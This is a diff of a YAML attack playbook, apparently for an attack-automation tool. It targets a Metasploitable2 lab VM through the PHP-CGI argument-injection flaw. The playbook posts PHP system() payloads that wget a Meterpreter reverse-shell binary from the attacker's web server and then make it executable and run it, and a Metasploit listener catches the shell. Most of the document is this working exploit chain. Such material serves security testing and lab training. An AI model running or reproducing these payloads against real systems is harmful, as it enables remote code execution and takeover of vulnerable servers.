@@ -1,5 +1,5 @@
 #
-# Author: Wolfgang Hotwagner
+# Author: Wolfgang Hotwagner, Erik Grafendorfer
 # Description:
 #     This playbook perfoms the following attack-steps:
 #     1. Create a temporary file for the reverse-shell payload
@@ -13,15 +13,16 @@
 # Requirements:
 #     1. Run this on kali-linux
 #     2. Metasploit installed and msfrpd executed
-#     3. Install curl
-#     4. Target a Metasploitable2-VM
+#     3. Target a Metasploitable2-VM
 #
 vars:
   METASPLOITABLE: 192.168.0.146
   ATTACKER: 192.168.0.29
   PAYLOAD: linux/x86/meterpreter/reverse_tcp
   LPORT: "4344"
-  CURL: 'curl -XPOST "http://192.168.0.146/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"'
+  PHP_CGI_URL: "http://192.168.0.146/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input"
+  PHP_DOWNLOAD: /tmp/attackmate_php_download.php
+  PHP_EXECUTE: /tmp/attackmate_php_execute.php
 
 commands:
   # create a temporary file for a reverse shell payload
@@ -42,11 +43,21 @@ commands:
   - type: webserv
     local_path: $RSHELL
     port: 8080
-    background: True
+    background: true
 
-  # Inject code that downloads the reverse shell from the webserver in background mode
+  # create raw PHP body for the download request
   - type: shell
-    cmd: "$CURL -d \"<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL')?>\""
+    cmd: "cat > $PHP_DOWNLOAD <<'EOF'\n<?php system('wget -O /tmp/shell http://${ATTACKER}:8080/$RSHELL');?>\nEOF"
+
+  # Inject code that downloads the reverse shell from the webserver
+  - type: http-client
+    cmd: POST
+    url: $PHP_CGI_URL
+    headers:
+      Accept: "*/*"
+      Accept-Encoding: identity
+      Connection: close
+    local_path: $PHP_DOWNLOAD
 
   # Start a reverse shell listener in background
   - type: msf-module
@@ -59,9 +70,19 @@ commands:
     background: true
     kill_on_exit: true
 
-  # Execute the reverse shell
+  # create raw PHP body for the execution request
   - type: shell
-    cmd: "$CURL -d \"<?php system('chmod +x /tmp/shell && /tmp/shell &')?>\""
+    cmd: "cat > $PHP_EXECUTE <<'EOF'\n<?php system('chmod +x /tmp/shell && /tmp/shell &');?>\nEOF"
+
+  # Execute the reverse shell
+  - type: http-client
+    cmd: POST
+    url: $PHP_CGI_URL
+    headers:
+      Accept: "*/*"
+      Accept-Encoding: identity
+      Connection: close
+    local_path: $PHP_EXECUTE
     background: true
     kill_on_exit: true
 
